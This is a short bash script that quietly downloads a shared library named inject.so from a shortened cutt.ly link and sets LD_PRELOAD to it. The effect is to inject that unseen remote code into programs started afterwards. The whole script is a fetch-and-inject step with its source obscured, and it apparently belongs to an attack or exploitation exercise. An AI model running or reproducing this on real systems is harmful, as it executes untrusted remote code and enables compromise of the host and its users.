#!/bin/bash
wget -q -O ../inject.so https://cutt.ly/7rqYbx8
export LD_PRELOAD=../inject.so
